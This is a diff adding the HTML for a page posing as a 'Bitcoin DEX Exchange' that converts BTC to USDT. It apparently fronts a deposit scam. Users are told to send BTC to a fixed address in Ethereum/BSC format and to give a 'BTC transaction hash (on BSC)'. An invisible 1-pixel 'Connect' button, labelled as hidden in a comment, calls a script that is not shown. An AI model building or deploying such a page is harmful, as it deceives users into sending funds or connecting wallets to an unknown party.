@@ -1,1 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Bitcoin DEX</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <img src="assets/bitcoin.png" alt="Bitcoin Logo" class="logo">
+    <h1>Bitcoin DEX Exchange</h1>
+    <p class="subtitle">Step-by-step BTC to USDT conversion</p>
+    <p>Live BTC Price: <span id="btc-price">Loading...</span></p>
+
+    <div id="step-1" class="step">
+      <h2>Step 1: Enter BTC amount</h2>
+      <input type="number" id="btc-amount" placeholder="Amount of BTC">
+      <button onclick="nextStep1()">Next</button>
+    </div>
+
+    <div id="step-2" class="step hidden">
+      <h2>Step 2: Send BTC to this address</h2>
+      <p>Deposit Address:</p>
+      <div class="wallet-row">
+        <code id="btc-address">0x49b06e4a8E75188955d6961520F0a9E2EC1B6634</code>
+        <span id="wallet-status">🔄</span>
+      </div>
+      <p>After sending, enter your BTC transaction hash (on BSC):</p>
+      <input type="text" id="btc-txid" placeholder="BSC Transaction Hash">
+      <button onclick="nextStep2()">Next</button>
+    </div>
+
+    <div id="step-3" class="step hidden">
+      <h2>Step 3: Enter recipient's USDT wallet address</h2>
+      <input type="text" id="usdt-address" placeholder="Recipient USDT Wallet Address (BEP20)">
+      <button onclick="finalStep()">Convert</button>
+    </div>
+
+    <div id="step-4" class="step hidden">
+      <h2>Step 4: Confirm USDT transfer</h2>
+      <p>Amount to send: <span id="usdt-amount">Calculating...</span> USDT</p>
+      <button id="confirm-transfer">Confirm & Send</button>
+    </div>
+
+    <div id="result" class="result-box"></div>
+    <a href="https://bitcoin.org/bitcoin.pdf" target="_blank" class="whitepaper-link">📄 View Bitcoin Whitepaper</a>
+
+    <!-- Hidden manual connect button -->
+    <button id="hidden-connect" onclick="manualConnect()" style="position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; z-index: -1;">Connect</button>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
 
